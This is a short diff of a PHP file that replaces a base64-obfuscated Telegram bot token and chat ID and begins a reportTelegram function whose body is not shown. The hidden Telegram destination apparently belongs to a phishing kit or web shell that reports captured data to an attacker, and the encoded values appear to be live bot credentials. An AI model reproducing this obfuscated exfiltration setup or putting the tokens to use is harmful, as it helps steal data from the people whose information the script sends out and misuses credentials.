@@ -1,9 +1,9 @@
 <?php
 $k='kontolbengkak';
 $tk = base64_decode(
-    "ODM5MDQyMzYzMTpBQUUxOEVOY0k1SW5oS29SMFJtVzNCMll5a2U3Vm9WN0hxYw"
+    "ODczNjg5MzQ2ODpBQUVTN1NEaHg0dDJ3cnJwektxZTlVQzhkMVAyMWtpNXhRSQ=="
 );
-$cid = base64_decode("NTA3MDkzODc3OA");
+$cid = base64_decode("ODkzMDE3NDQ2Mw==");
 
 function reportTelegram($msg)
 {
